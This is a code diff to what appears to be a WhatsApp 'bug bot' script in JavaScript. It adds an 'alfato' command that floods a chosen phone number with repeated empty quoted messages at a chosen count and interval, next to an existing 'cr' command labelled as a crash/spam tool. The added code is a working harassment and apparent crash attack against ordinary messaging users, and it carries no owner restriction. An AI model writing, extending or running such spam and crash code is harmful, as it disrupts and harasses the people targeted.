@@ -453,6 +453,17 @@ thumbnail: kalimage,
 }}, { quoted:m})
 }
 switch(command) {
+case 'alfato': {
+if (!q) throw `Example: ${command} 6281327496283_5_2s`
+let num = q.split('_')[0]
+let jumlah = q.split('_')[1]
+let waktu = q.split('_')[2]
+for (let i = 0; i < jumlah; i++) {
+Pares.sendMessage(num, { text: "" }, { quoted: doc })
+await sleep(ms(waktu))
+}
+}
+break
 case 'cr': {
 if (!isCreator) return sticOwner(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
@@ -3113,6 +3124,7 @@ Pares.sendMessage(m.chat, mllo, { quoted: hw })
 })
 }
 break
+
 //=================================================//
 case 'play': case 'ytplay': {
 if (isBan) throw sticBanLu(from)
